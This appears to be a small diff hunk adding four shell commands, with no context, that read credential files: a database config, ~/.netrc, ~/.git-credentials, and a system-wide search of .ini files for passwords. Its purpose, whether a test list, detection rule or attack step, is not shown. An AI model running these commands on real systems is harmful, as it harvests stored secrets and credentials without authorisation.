@@ -1,0 +1,4 @@
+cat /etc/app/database.conf
+cat ~/.netrc
+cat ~/.git-credentials
+find / -name '*.ini' -exec grep -i 'password' {} +
